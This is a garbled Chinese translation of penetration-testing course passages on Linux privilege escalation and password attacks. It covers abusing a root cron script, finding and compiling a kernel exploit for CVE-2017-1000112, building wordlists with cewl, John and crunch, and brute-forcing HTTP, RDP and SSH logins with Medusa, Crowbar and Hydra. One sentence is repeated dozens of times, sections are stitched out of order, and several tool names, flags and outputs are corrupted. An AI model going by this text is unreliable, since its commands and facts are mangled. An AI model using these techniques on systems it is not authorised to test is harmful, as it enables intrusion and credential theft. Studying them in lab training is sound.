+为了本示例的目的，我们将 `SSH` 到我们的 Debian 客户端。在之前的节中，我们展示了在目标系统中哪里查找 `cron` 任务。我们也可以检查日志文件 (`/var/log/cron.log`) 中的 `cron` 任务：
+
+```
+student@debian:- grep "CRON" /var/log/cron.log
+Jan 27 15:55:26 cron[719]: (CRON) INFO (pid = 3)
+Jan 27 15:55:26 cron[719]: (CRON) INFO (Running)
+Jan 27 17:45:01 cron[2615]: (ROOT) CMD (cd /var/scripts && ./userbackups.sh)
+Jan 27 17:50:01 cron[2621]: (ROOT) CMD (cd /var/scripts && ./userbackups.sh)
+Jan 27 17:55:01 cron[2656]: (ROOT) CMD (cd /var/scripts && ./userbackups.sh)
+Jan 27 18:00:01 cron[2671]: (ROOT) CMD (cd /var/scripts && ./userbackups.sh)
+```
+
+似乎位于 `/var/scripts/` 下的脚本 `user_backups.sh` 在 `root` 用户的上下文中执行。由于我们知道脚本的位置，可以检查它的权限，并且该任务每五分钟运行一次。
+
+
+
+```
+student@debian:-$ cat /var/scripts/user_backups.sh
+#!/bin/bash
+cp -rf /home/student/* /var/backups/student/
+
+student@debian:-$ ls -lah /var/scripts/user_backups.sh
+-rw-r--r-- 1 root root 522 Jan 27 17:02 /var/scripts/user_backups.sh
+```
+
+脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。
+
+由于我们可以检查脚本的权限，且该任务每五分钟运行一次（注：原文此处有重复或乱码，翻译按原文逻辑处理）。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。
+
+```
+student@debian:-$ cat /var/scripts/user_backups.sh
+#!/bin/bash
+cp -rf /home/student/* /var/backups/student/
+
+student@debian:-$ ls -lah /var/scripts/user_backups.sh
+-rw-r--r-- 1 root root 522 Jan 27 17:02 /var/scripts/user_backups.sh
+```
+
+脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。由于我们可以检查脚本的权限，且该任务每五分钟运行一次（注：原文此处有重复或乱码，翻译按原文逻辑处理）。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。
+
+脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身简单。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单。
+
+```
+student@debian:-$ cat /var/scripts/user_backups.sh
+#!/bin/bash
+cp -rf /home/student/* /var/backups/student/
+```
+
+（注：原文此处存在大量重复文本）
+
+# 基于 Kali Linux 2.0 的渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_564_0.png)
+
+太好了！我们成功地将权限从 `admin-pc-n00b` 提升到了 `nt authority\system`，这是 Windows 中权限最高的账户。
+
+## 18.3 权限提升示例
+
+在本节中，我们将注意力转向基于 Linux 的目标。我们将讨论 Linux 权限并演示一些基于 Linux 的权限提升技术。
+
+### 18.3.1 理解 Linux 权限
+
+在讨论权限提升技术之前，让我们花一点时间简要讨论 Linux 权限、访问控制和用户。
+
+Linux 及其衍生系统的定义特征之一是大多数资源（包括文件、目录、设备甚至网络通信）都在文件系统中表示出来。
+
+# 攻击性安全
+
+用俗语来说，“一切皆文件”（通过此类推，Linux 系统的每一个元素）都遵循基于三个主要属性的用户和用户组权限：读取、写入和执行。
+
+### 18.3.2 不安全的文件权限：Cron 案例研究
+
+当我们把注意力转向权限提升技术时，首先将利用不安全的文件权限。在 Windows 示例中，我们假设已经以非特权用户的身份访问了 Linux 目标机器。
+
+为了利用不安全的文件权限，我们必须找到一个不仅允许写入访问而且以高权限运行的文件。在 Linux 系统上，基于 `cron` 的调度器是一个首要目标，系统级计划任务是以 `root` 权限执行的。
+
+为了本示例的目的，我们将 SSH 到我们的 Debian 客户端。在之前的节中，我们展示了在目标系统中哪里查找 `cron` 任务。我们也可以检查日志文件 (`/var/log/cron.log`) 中的 `cron` 任务：
+
+```
+student@debian:- grep "CRON" /var/log/cron.log
+Jan 27 15:55:26 cron[719]: (CRON) INFO (pid = 3)
+Jan 27 15:55:26 cron[719]: (CRON) INFO (Running)
+Jan 27 17:45:01 cron[2615]: (ROOT) CMD (cd /var/scripts && ./userbackups.sh)
+Jan 27 17:50:01 cron[2621]: (ROOT) CMD (cd /var/scripts && ./userbackups.sh)
+Jan 27 17:55:01 cron[2656]: (ROOT) CMD (cd /var/scripts && ./userbackups.sh)
+Jan 27 18:00:01 cron[2671]: (ROOT) CMD (cd /var/scripts && ./userbackups.sh)
+```
+
+似乎位于 `/var/scripts/` 下的脚本 `user_backups.sh` 在 `root` 用户的上下文中执行。由于我们知道脚本的位置，可以检查它的权限，并且该任务每五分钟运行一次。
+
+```
+student@debian:-$ cat /var/scripts/user_backups.sh
+#!/bin/bash
+cp -rf /home/student/* /var/backups/student/
+
+student@debian:-$ ls -lah /var/scripts/user_backups.sh
+-rw-r--r-- 1 root root 522 Jan 27 17:02 /var/scripts/user_backups.sh
+```
+
+脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。由于我们可以检查脚本的权限，且该任务每五分钟运行一次。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单；它只是简单地将学生目录的内容复制到 `/var/backups/student/`。脚本本身非常简单。
+
+（此处省略重复内容）
+
+# 基于 Kali Linux 2.0 的渗透测试
+
+```
+student@debian:-$ echo "root2:..."
+```
+
+
+
+# CVE 2017-1000112 案例研究
+
+内核是提升权限的极佳方式，这不仅取决于内核版本，还取决于操作系统的偏好，包括 Debian、Redhat、Gentoo 等。
+
+为了演示这种攻击向量，我们将通过检查 `/etc/issue` 文件获取有关目标的更多信息。正如模块早早部分过的，这是一个系统文本文件，在 Linux 机器的登录提示之前会打印消息或系统识别信息。
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_568_0.png)
+
+```
+$ cat /etc/issue
+Ubuntu 16.04.3 LTS #1 \
+```
+
+| 列表 587 - 收集目标系统信息 |
+
+接下来，我们将使用标准系统命令检查内核版本和架构：
+
+```
+$ uname -r
+4.8.0-generic
+$ uname -m
+x86_64
+```
+
+| 列表 588 - 从我们的 Linux 系统中收集内核和架构信息 |
+
+我们的我们的目标系统似乎运行在 x86_64 架构上的 Ubuntu 16.04.3 LTS (4.8.0-58-generic)。利用这些信息，我们可以在本地的 Kali 系统上使用 `searchploit` 来寻找与目标匹配的内核漏洞。
+
+```
+$ searchploit kernel ubuntu 16.04
+```
+
+| 漏洞标题 | 路径 (/usr/share/exploit/) |
+
+| :--- | :--- |
+
+| Linux Kernel (Debian 7.7.8/5.9 / 0 / Ubuntu 14.04.2/16.04 / 14.04.5.2/17.0) | exploits/linux/x86_64/local/ |
+
+| Linux Kernel (Ubuntu 16.04) - Reference Count Overflow | exploits/linux/x86_64/local/422 |
+
+| Linux Kernel (Ubuntu 16.04) | exploits/linux/dos/39773.txt |
+
+| Linux Kernel 4.4 (Ubuntu 16.04) - 'BPP' Local Privilege | exploits/linux/local/40759.r |
+
+| Linux Kernel 4.4.0 (Ubuntu 16.04/16.04 x86-64) | exploits/linux_x86-64/local/ |
+
+| Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter ta | exploits/linux/x86_64/local/ |
+
+| Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput(1)' b | exploits/linux/local/39772.t |
+
+| Linux Kernel 4.6.2-1) - PR__SO_SET_KERNEL | exploits/linux/local/40848.t |
+
+| Linux Kernel < 4.4.0-83 < 4.8.0 (Ubuntu 16.04/16.04) | exploits/linux/local/43418.c |
+
+| 列表 589 - 为我们的目标寻找权限提升漏洞 |
+
+最后一个漏洞 (`exploits/linux/local/43418.c`) 似乎与我们目标的内核版本直接对应。我们需要在目标上运行该程序来提升我们的权限。
+
+### 18.3.4.1 在 Linux 上编译 C/C++ 代码
+
+我们将使用 `gcc` 来编译漏洞利用。请记住，在编译代码时，我们必须与目标架构匹配。在目标机器没有编译器，且我们被迫在攻击机器或复制了该操作系统和架构的沙箱环境中编译漏洞程序的情况下，这一点尤为重要。
+
+在这个例子中，我们很幸运目标机器有一个可工作的编译器，但这在领域内是很罕见的。
+
+让我们复制漏洞利用文件以进行编译，仅传递源代码并使用 `-o` 指定文件名（`exploit`）：
+
+```
+$ gcc 43418.c -o exploit
+$ ls -lh exploit
+```
+
+> 5⁴ (GCC, 2019), https://gcc.gnu.org
+
+PWK 20 | Copyright © Offensive Security Ltd. All rights reserved. | 569
+
+## OFFENSIVE SECURITY
+
+使用 Kali Linux 2.0 进行渗透测试
+
+total 36K
+
+-rwxr-xr-x 1 kali kali 28K Jan 27 04:04 exploit
+
+列表 590 - 在我们的目标机器上编译漏洞利用程序，我们可以运行它并使用 `whoami` 检查我们的权限级别：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_569_0.png)
+
+> 图 293：通过权限提升漏洞在 Linux 上提升权限
+
+图 293 显示我们的权限已成功从 `nobody`（标准用户）提升到 `root`，这是 Linux 操作系统上的最高账户。
+
+### 18.4 总结
+
+在本模块中，我们涵盖了 Windows 和 Linux 操作系统以及不同架构上的权限提升概念。我们涵盖了手动和自动的枚举技术，这些技术揭示了此类攻击所需的信息。此外，我们演示了这两种操作的编译过程，演示了多次权限提升攻击，以及各种不需要软件漏洞的权限提升方式。
+
+PWK 2.0                                                              © Offensive Security Ltd. All rights reserved.                                               570
+
+## 19. 密码攻击
+
+密码是用户账户和服务身份验证的最基本的形式，据此类，密码攻击的目标是发现并使用有效的凭据。
+
+通常，密码攻击有两种方法。我们可以使用字典攻击或暴力破解。在某些情况下，我们可能会使用一个常用密码列表，或者使用工具来生成它们。
+
+在本模块中，我们将讨论每种技术。
+
+### 19.1 字典列表
+
+字典列表（有时称为字典文件）是包含作为输入的简单文本文件。Kali 包含了许多预构建的字典列表，例如 `/usr/share/wordlists/` 中的。
+
+我们可以通过添加特定目标的单词和短语来提高字典列表的有效性。例如，考虑 MegaCorp，一家经营纳米科技的公司。网站 megacorp.com 列出了产品，包括 Nanobot。在假设的评估中，我们识别出了低级密码 Nanobot93。假设这是我们公司的常见格式，我们想要创建一个识别其他密码的自定义字典列表。
+
+我们可以浏览网站并将常用术语手动添加到字典列表中，或者使用像 `cwl` 这样的工具来完成这些工作。正如 `-help` 输出所示，该工具可以通过选择多个选项进行配置，我们将关注几个关键参数。
+
+例如，以下命令提取 megacorp.com，列出至少六个字符的单词 (`-m 6`)，并将字典列表写入 (`-w`) 自文件 (`megacorp-cwl.txt`)。
+
+```
+kali@~$ cwl megacorp.com -m 6 -w megacorp-cwl.txt
+kali@~$ wc -l megacorp-cwl.txt
+```
+
+```
+kali@~$ grep Nano megacorp-cwl.txt
+Nanotechnology
+Nanonite
+Nanrobe
+Nanoprocessors
+NanoTimes
+Nanobot
+```
+
+> 列表 591 - 使用 cwl 创建字典文件
+
+上面的列表显示 cwl 创建了几个产品的名称，包括 Nanobot。我们应该考虑其他产品名称也可能被用于密码的可能性。
+
+然而，这些单词本身将是极其弱的密码，无法满足典型的密码策略规则。这类规则通常要求使用大小写字母、数字，可能还有特殊字符。根据我们发现的密码 (Nanobot93)，我们建议 megacorp 的密码策略要求密码中至少包含两个数字，并可能进一步规定（尽管这不太）数字必须位于密码末尾。
+
+¹⁵⁴(DigNinja, 2017), http://www.digninja.org/projects/cwl.php
+
+为了这个简单的演示，我们假设 Megacorp 的策略规定密码必须包含一个两位数字。
+
+为了创建符合此要求的密码，我们可以编写一个 Bash 脚本。然而，我们将使用一个强大得多的工具，称为 John the Ripper (JTR)⁵。它是一个快速的密码破解器，具有生成自定义字典列表和规则变体的能力。
+
+
+
+继续基于密码策略的假设，我们将在 JTR 配置文件 `/etc/john/john.conf` 中添加一条规则，以变变我们的字典列表，在每个密码末尾附加两个数字。为了做到，我们必须找到定义字典列表规则的 `[List.Rules:Wordlist]` 段，并添加一条新规则。例如，我们将在字典列表中的每个单词后附加从 0 到 99 的两位数字序列。
+
+我们用 `$` 字符开始这条规则，它告诉 John 在字典列表中的原始单词后添加一个字符。接下来，我们指定想要添加的字符类型，在本例中，我们想要 `[0-9]` 之间的任何数字。最后，为了添加两个数字，我们只需重复 `$[0-9]`。最终的规则如列表 592 所示。
+
+```
+kali@kali:~$ sudo nano /etc/john/john.conf
+
+# Wordlist mode rules
+[List.Rules:Wordlist]
+# 尝试原样的单词
+# 将每个纯字母数字单词转换为小写
+-c >? !X l Q
+# 将每个纯字母数字单词转换为大写
+-c (<?) !C Q
+# 将纯字母单词转换为小写并变为复数
+
+# 尝试分割密码的后半部分
+-s x_
+-s x_ M Q
+# 在每个密码末尾两个数字
+$[0-9]
+```
+
+列表 592 - 在 John the Ripper 配置文件创建变异规则
+
+> John the Ripper 的语法非常广泛且强大，但超出了本模块的范围。欲了解更多信息，请花时间查看规则文档。
+
+现在规则已添加到配置文件中，我们可以变异字典列表了，它目前包含 312 个条目。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+为此，我们将调用 `john` 并指定字典文件 (`--wordlist=megacorp-cewl.txt`)，激活配置文件中的规则 (`--rules`)，将结果输出到标准输出 (`--stdout`)，并重定向到名为 `mutated.txt` 的文件。
+
+```
+kali@kali:$ john --wordlist=megacorp-cewl.txt --stdout > mutated
+按 'q' 或 Ctrl-C 终止，按其他键查看状态
+4644kp 0:00:00:00 100.00% (2018-03-01 15:41) 66354p/s chocolate99
+```
+
+```
+kali@kali:$ grep Nanobot mutated.txt
+...
+Nanobot90
+Nanobot91
+Nanobot92
+Nanobot93
+Nanobot94
+Nanobot95
+Nanobot96
+...
+```
+
+列表 593 - 使用 John the Ripper 变异密码
+
+由于对密码进行了多次变异，生成的文件包含超过46000 个密码。其中一个密码是 'Nanobot93'它与我们在假设评估中发现的密码匹配。考虑到对 MegaCorp 密码策略的假设，此字典可以在字典攻击中产生结果。
+
+尽管这个演示过于简化，但它是一个很好的示例，说明了密码分析如何对我们密码攻击的整体成功有利。
+
+## 19.1.1.1 练习
+
+（此练习不需要报告）
+
+- 1. 使用 `cwl` 从你的公司或喜欢的网站生成自定义字典列表并检查结果。你的任何密码会出现吗？
+
+## 19.2 暴力破解单词
+
+与字典攻击相反，暴力破解会计算并测试可能组成密码的所有字符组合，直到找到正确的密码。虽然这听起来像是一个保证结果的简单方法，但它极其耗时。取决于密码的长度、复杂度以及测试系统的计算能力，破解一个密码可能需要很长时间，甚至数年。
+
+我们可以结合这两个概念并创建暴力破解字典列表，即包含匹配特定模式的所有可能密码的字典文件。
+
+例如，考虑一个揭示了特定密码执行策略的场景，如列表 594 所示：
+
+```
+kali@kali:$ cat dumped.pass.txt
+david: Abc#123
+mike: Jud(666)
+Judy: Holi&278
+```
+
+![](img/f99f528ca9845f4c256ce54e882b1345_575_0.png)
+
+列表 594 - 密码导出示例
+
+查看这些密码，我们注意到密码结构中的以下模式：
+
+[大写字母] [2 x 小写字母] [2 x 特殊字符] [3 x 数字]
+
+列表 595 - 密码结构
+
+有了这个，创建一个包含所有匹配此模式的密码的字典列表非常有帮助。Kali Linux 自带的 Crunch 是强大的字典列表生成器，可以处理此任务。
+
+首先，我们必须描述我们需要 `crunch` 的模式，为此我们将代表特定类型字符的占位符：
+
+| 占位符 | 类型 |
+| :--- | :--- |
+| @ | 字符集 |
+| --- | 小写 |
+| , | 大写 |
+| % | 数字 |
+| A | 特殊字符 |
+
+规则模式和预定义的字符集，以便生成包含该用户密码的字典列表。
+
+## 19.3 常见网络服务攻击方法
+
+现在我们已经理解了如何为各种情况创建有效的字典列表，我们可以讨论如何使用它们来对常见网络服务进行密码攻击。
+
+> 请记住，针对网络服务的密码攻击具有很高的噪声，在某些情况下是危险的。多次登录失败通常会在目标系统上生成日志和警告，并在达到预定义的失败登录尝试次数后锁定账户。这在渗透测试期间可能是灾难性的，导致用户在管理员重新启用账户之前无法访问生产系统。在盲目运行基于网络的暴力破解之前，请务必记住这一点。
+
+一旦我们权衡了风险和目标网络的状况，就可以采取几个步骤来提高密码测试的效率。
+
+取决于协议和密码破解工具，我们可以增加登录线程数来提高攻击速度。然而，在某些情况下（如 RDP 和 SMB），由于协议限制，可能无法增加线程数，我们的优化尝试可能会减慢进程。
+
+此外，值得注意的是，RDP 等协议的身份验证协商过程比 HTTP 更耗时。然而，虽然攻击 RDP 协议可能比 HTTP 花费更多时间，但成功攻击 RDP 通常会带来更好的回报。网络服务攻击的秘密在于启动攻击之前，仔细且智能地选择合适的目标、用户和密码。
+
+要成功攻击服务（如 HTTP、SSH、VNC、FTP、SNMP 和 POP3）的密码，我们不仅必须匹配目标用户名和密码，还要匹配验证过程中使用的协议。
+
+幸运的是，像 THC-Hydra、Medusa、Crowbar 和 spray 等流行工具可以为我们处理这些请求。
+
+在本节中，我们将检查这些每个工具以及它们有效的协议和业务处理能力。下文中提到的工具可能具有相似的能力和速度。使用“正确”工具通常取决于偏好的语法，而只有通过在测试环境中体验每种工具并学习它们的优缺点和独特性，才能确定输出输出。
+
+### 使用 Kali Linux 2.0 进行渗透测试
+
+#### 19.3.1 使用 Medusa 进行 HTTP htaccess 攻击
+
+根据作者的介绍，Medusa 旨在成为一个“快速、大规模并行、模块化的登录暴力破解工具”。
+
+我们将使用 Medusa 进入受 htaccess 保护的 Web 目录。
+
+首先，我们将设置目标，即 Windows 客户端上的 Apache Web 服务器，我们将通过 XAMPP 控制面板启动它。我们将尝试访问该服务器上受 htaccess 保护的文件夹 `/admin`。本例选择的字典是 `/usr/share/wordlists/rockyou.txt.gz`，我们必须先用 `gunzip` 对其解压。
+
+```
+kali@kali:~$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+列表 601 - 解压 rockyou 列表
+
+接下来，我们将启动 Medusa 并对目标 `10.0.11.02` 上的受 htaccess 保护的 URL (`-h DIR/admin`) 发起攻击。我们将使用 rockyou 字典文件 (`-p /usr/share/wordlists/rockyou.txt`) 中的密码对用户 (`-u admin`) 进行攻击，而且我们当然会使用 HTTP 身份验证方案 (`-m`)：
+
+```
+kali@kali:~$ medusa -h 10.0.11.02 -u admin -p /usr/share/wordlists/rockyou.txt -m http -m DIR/admin
+Medusa v2.2 (http://www.footfus.net) - JoMo-Kun / Foofus Networks jmk@footfus.net>
+```
+
+
+
+```
+ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: 123456 (1 of 14434391)
+ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: 12345 (2 of 14434391)
+ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: 1345678 (3 of 14434391)
+ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: password (4 of 14434391)
+ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: iloveyou (5 of 14434391)
+```
+
+```
+ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: samsung (255 of 14434391)
+ACCOUNT CHECK: [http] Host: 10.0.11.02 User: admin Password: freedom (256 of 14434391)
+ACCOUNT FOUND: [http] Host: 10.0.11.02 User: admin Password: freedom [SUCCESS]
+```
+
+列表 602 - 使用 Medusa 进行 HTTP htaccess 攻击
+
+在这种情况下，Medusa 发现了密码 `'freedom'`。
+
+Medusa 许多许多选项和设置，如列表 603 的输出所示：
+
+```
+kali@kali:~$ medusa
+Medusa v2.2 (http://www.footfus.net) - JoMo-Kun / Foofus Networks jmk@footfus.net>
+
+ALERT: Host must be supplied.
+
+```
+
+Syntax: `Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -m module [OPT]`
+
+`-h [TEXT]` : 目标主机名或 IP 地址
+
+`-H [FILE]` : 包含主机名或 IP 地址的文件
+
+`-u [TEXT]` : 要测试的用户名
+
+`-U [FILE]` : 包含用户名的文件
+
+`-p [TEXT]` : 要测试的密码
+
+`-P [FILE]` : 包含密码的文件
+
+`-C [FILE]` : 包含组合的文件
+
+`-m [TEXT]` : 模块名称。每次可以使用不同的参数多次传递给模块。
+
+`-d` : 转储所有已知模块
+
+`-n [NUM]` : 用于非默认 TCP 端口
+
+`-s` : 启用 SSL
+
+`-g` : 连接连接 NUM 秒后放弃（默认 3）
+
+`-r` : 放弃前的重试间隔秒数。限制总尝试次数
+
+`-c` : 等待 socket 可用的时间（默认 500 秒）
+
+`-t [NUM]` : 同时进行的测试数
+
+`-T [NUM]` : 同时进行的主机数
+
+`-L` : 每个线程并行一个用户名。默认在继续之前输入用户名。
+
+`-f` : 发现第一个有效用户名/密码后停止
+
+`-a` : 在任何主机上发现第一个有效用户名/密码后停止
+
+`-b` : 启动 banner
+
+`-q` : 显示模块信息
+
+`-v [NUM]` : 详细级别 [0 - 6)]
+
+`-w [NUM]` : 调试级别 [0 - 10]
+
+`-V` : 显示版本
+
+`-Z [TEXT]` : 基于之前的扫描恢复
+
+列表 603 - Medusa 选项和模块
+
+该工具可以与多种网络协议交互，如列表 604 所示的 `-d` 选项显示。
+
+```bash
+kali@$ medusa -d
+
+Medusa v2.2 (http://www.footfus.net) - JoMo-Kun / Foofus Networks jmk@footfus.net
+
+Available modules in "/usr/lib/medusa/":
+
+cvs.mod : CVS 会话暴力破解模块：版本 2.0
+
+ftp.mod : FTP/FTPS 会话暴力破解模块：版本 2.1
+
+http.mod : HTTP 暴力破解模块：版本 2.1
+
+imap.mod : IMAP 会话暴力破解模块：版本 2.0
+
+msql.mod : MS-SQL 会话暴力破解模块：版本 2.0
+
+mysql.mod : MySQL 会话暴力破解模块：版本 2.0
+
+...
+```
+
+列表 604 - Medusa 选项和模块
+
+### 19.3.1.1 练习（这些练习不需要报告）
+
+- 对 htaccess 保护的文件夹重复密码攻击。
+- 创建一个包含你的 Windows 客户端密码的密码列表，并对 Windows 客户端上的 SMB 协议进行密码攻击。
+
+### 19.3.2 使用 Crowbar 进行远程桌面协议攻击
+
+Crowbar（以前称为 Hydra）是一种主要用于利用 SSH 密钥而非密码的网络身份验证工具。它也是少数能够可靠高效地对现代版本 Windows 的远程桌面协议 `RDP` 服务进行密码攻击的工具之一。让我们从 Kali 仓库安装 Crowbar 并尝试这种攻击。
+
+```
+kali@kali~$ sudo apt install crowbar
+
+Reading package lists... Done
+
+Building dependency tree
+
+Reading state information... Done
+```
+
+列表 605 - 使用 apt 安装 Crowbar
+
+要调用 Crowbar，我们将如列表 606 所示指定前缀 `-b`、目标服务器 `-s`、用户名 `-u` 和线程数 `-n`：
+
+```
+kali@kali:~ crowbar -b rdp -s 10.11.0.22 -u admin -C -f/password-file.txt -n 1
+
+2019-06-18 14:51:12 v0.3.5-dev
+
+2019-06-18 14:51:12 Trying 10.11.0.22:3389
+
+2019-06-18 14:51:13 RDP-SUCCESS : 10.11.0.22:3389 - admin:offsec!
+
+2019-06-18 14:51:13 STOP
+```
+
+列表 606 - 使用 Crowbar 进行 RDP 密码攻击
+
+注意 Crowbar 发现了 `"admin"` 用户的有效凭据。我们使用了单线程，因为远程桌面协议不支持多线程。
+
+要查看更多选项，我们可以带有 `--help` 标志运行 crowbar：
+
+```
+kali@kali:~ --help
+
+usage: Usage --help 获取更多信息
+
+Crowbar 是一个支持 OpenVPN、远程桌面协议、SSH 私钥和 VNC 密钥的暴力破解工具。
+
+位置参数：
+
+选项
+
+可选参数：
+
+-h, --help 显示此帮助消息并退出
+
+-b {vckney,sshkey,rdp,openvpn}, --brute {vckney,sshkey,rdp,openvpn}
+
+目标服务
+
+静态目标
+
+-s SERVER, --server SERVER
+
+-S SERVER_FILE, --serverfile SERVER_FILE
+
+存储在文件中的多个目标
+
+-u USERNAME [USERNAME ...] USERNAME [USERNAME]
+
+登录的静态名称
+
+-U USERNAME_FILE, --username USER_FILE
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+多个用于登录的密码列表，存储在文件中
+
+- -n THREAD, --number THREAD: 同时活跃的线程数
+
+- -l FILE, --log FILE: 日志文件（仅写入尝试记录）
+
+- -o FILE, --output FILE: 输出文件（写入其他所有内容）
+
+- -c PASSWD, --password PASSWD: 用于登录的静态密码
+
+- -c FILE, --passwordfile FILE: 存储在文件中的多个登录密码
+
+- -t TIMEOUT, --timeout TIMEOUT: [SSH] 等待每个线程持续时间（秒）
+
+- -p PORT, --port PORT: 如果服务不是默认值，则更改端口
+
+- -k KEY_FILE, --keyfile: [SSH] （私）密钥文件或包含多个文件的文件夹
+
+- -m CONFIG, --config CONFIG: [OpenVPN] 配置文件
+
+- -d, --discover: 在攻击开放端口之前进行端口扫描
+
+- -v, --verbose: 启用详细输出（-vv 获取更多信息）
+
+- -D, --debug: 启用调试模式
+
+- -q, --quiet: 仅显示成功的登录
+```
+
+列表 607 - Crowbar 帮助输出
+
+
+
+## 19.3.2.1 练习
+
+（这些练习不需要报告）
+
+- 创建一个包含你的 Windows 客户端密码的列表，并对 Windows 客户端重复上述 Crowbar 密码攻击。
+
+## 19.3.3 使用 THC-Hydra 进行 SSH 攻击
+
+`THC-Hydra` 是另一个正在积极开发的强大网络服务攻击工具，值得关注。我们可以使用它来攻击各种身份验证方案，包括 `SSH` 和 `HTTP`。
+
+标准选项包括 `-1` 指定目标用户名，`-P` 指定字典文件，以及 `protocol://IP` 分别指定目标和 IP 地址。
+
+在这个示例中，我们将使用 Kali 虚拟机。我们将在本地机器的 `ssh://127.0.0.1` 上、在 kali 上 `- kali` 上使用它，并使用 root 密码 `-`：
+
+```
+kali@kali: $ hydra -1 kali -P /usr/share/wordlists/rocky.txt ssh://127.0.0.1
+Hydra v0.8 (c) 2019 by van Hauser / THC - does not use in military or secret service
+```
+
+```
+Hydra (https://github.com/vanhauser-thc/hydra) starting at 2019-06-07 08:35:59
+[WARNING] Making the number of parallel threads, is to recommend
+[DATA] make 16 tasks per server, overall 16 tasks, 1434439 login tries (l:1/p:1434434)
+[DATA] attacking ssh://127.0.0.1:22/
+[ssh] host: 127.0.0.1 login: kali password: whatever
+1 of target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/hydra) finished at 2019-06-07 08:36:13
+```
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. All rights reserved.
+
+# 列表 608 - 使用 Hydra 进行 SSH 攻击
+
+在输出中，我们看到 `Hydra` 发现了针对本地 `SSH` 服务器的有效登录。
+
+`THC-Hydra` 支持如列表 609 所示的许多标准协议和服务：
+
+```
+kali@local:$ hydra
+Hydra v0.8 (c) 2019 by Hauser/THC - Please not use in military or secret servic
+Syntax: hydra [[-L LOGIN-L FILE] [-P PASS-P FILE] [[ FILE]] [-e nsr] [-o FILE]
+-t TASKS] [-M FILE -T TASKS]] [-w TIME] [-w TIME] [-s PORT] -x MIN:MAXCHARSET
+-c TIME] [-Soutvd46] [server=HOST[:PORT]]
+
+Supported services: 65000 asterisk cisco-cisco cisco-server firebird ftp http[]
+-[head][get]http[ [get-post]-http-post-proxy-http-proxy-umlen icap imaps irc map
+ldap2[s] ldap3-[eram]digestmd5] mysql oracle oracle-listener oracle-sid pcandy
+where pcnfs pop3[s] postgres radmin r2 redis redisclcin rcap rtsp s7-300 sip
+smb smbt[smtp] smtp-emun socks socks5 sshkey teamspeak telnet[s] vmauth vnc xmpp
+```
+
+列表 609 - Hydra 支持的模块
+
+## 19.3.3 练习
+
+（这些练习不需要报告）
+
+- 1. 针对你的 Kali 虚拟机重新创建 Hydra SSH攻击。
+
+## 19.3.4 使用 THC-Hydra 进行 HTTP POST 攻击
+
+作为一个额外的示例，我们将使用 `Hydra` 对我们的 Windows Apache 进行 HTTP POST 攻击。当使用 HTTP POST 请求用户登录时，通常通过 Web 表单，这意味着我们应该使用 "`http-post-service`" 。我们可以通过 `-U` 提供服务名称以获取所需参数的额外信息。
+
+```
+kali@local:$ hydra http-post-form -U
+...
+Help for module http-post-form:=======================================
+Module http-post-form 需要表单的页面和参数。
+```
+
+默认情况下，此模块配置为连续最多 5 次重定向。它始终从同一个 URL 收集新的 cookie，参数是用冒号分隔的值，加上可选的值。（注意：如果你在字符串中使用冒号，请用 ":" 进行转义）
+
